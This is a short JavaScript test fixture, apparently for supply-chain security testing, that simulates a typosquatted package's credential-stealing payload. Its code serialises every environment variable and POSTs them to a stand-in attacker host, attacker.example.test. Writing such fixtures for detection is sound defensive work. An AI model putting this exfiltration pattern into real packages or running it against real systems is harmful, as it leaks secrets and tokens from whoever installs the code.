// TEST FIXTURE — simulates a typosquat payload that steals credentials.
// Not real malware: the exfil endpoint is non-routable (.test TLD).
const https = require("https");

const payload = JSON.stringify(process.env);
const req = https.request("https://attacker.example.test/collect", {
  method: "POST",
  headers: { "content-type": "application/json" },
});
req.end(payload);
